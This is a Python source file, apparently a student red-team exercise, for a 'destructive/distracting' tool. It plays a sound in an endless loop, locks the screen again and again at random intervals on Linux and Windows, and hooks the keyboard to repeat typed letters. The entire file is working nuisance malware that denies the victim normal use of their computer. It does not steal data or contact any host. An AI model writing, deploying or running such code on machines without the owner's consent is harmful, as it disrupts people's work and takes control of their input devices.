""" 
File: RedTeamDistractionTool.py
Description: A destructive/distracting red team tool that will play an annoying sound,
            lock your computer screen, and manipulate keyboard input.
Language: Python3
Author: Kelly Vo - kdv6978@rit.edu
"""

import ctypes
import keyboard
import os
import platform as p
from playsound import playsound
import random as r
import string
from threading import Thread
import time


'''
lockScreen locks the computer screen
'''
def lockScreen():
    # Constantly locks screen every so often
    while True:
        # Error handler
        try:
            # Pick a random number for the program to wait until it locks the
            # computer screen again
            secs = r.randint(1, 61)
            # If the system platform is linux
            if p.system().lower() == 'linux':
                # Lock screen
                os.popen('gnome-screensaver-command --lock')
            # If the system platform is windows
            if p.system().lower() == 'windows':
                # Lock screen
                ctypes.windll.user32.LockWorkStation()
            # Waits a secs amount of time before locking the computer screen again
            time.sleep(secs)
        # Catches error by passing
        except:
            pass


'''
playSound plays the sound
'''
def playSound():
    # Contantly plays sound
    while True:
        # Plays Dial.mp3
        playsound('Dial.mp3')


'''
keyPressed takes in an input key and randomly from 1-5 repeat the input key
# Param - key is an input key
'''
def keyPressed(key):
    # Error handler
    try:
        # pressNum is a random number from 1-5
        pressNum = r.randint(1, 5)
        # if input key is pressed
        if keyboard.is_pressed(key):
            # Press the input key pressNum amount of times
            for i in range(0, pressNum):
                keyboard.write(key)
    # Catches error by passing
    except:
        pass


'''
main runs program
'''
def main():
    # play is a new thread is created so that the program can play the
    # sound and move on to the other lines of code, instead of waiting
    # for the sound to end.
    play = Thread(target=playSound)
    play.start()

    # lock is a new thread is created so that the program can lock the
    # screen every so often and move on to the other lines of code,
    # instead of waiting for the screen to lock every so often.
    lock = Thread(target=lockScreen)
    lock.start()

    # Constantly waiting for keyboard input so that the program can mimic the
    # keyboard
    while True:
        # keys is a list of ascii characters [a-zA-Z]
        keys = list(string.ascii_letters)
        for key in keys:
            keyPressed(key)


# Calls main to run program
if __name__ == "__main__":
    main()
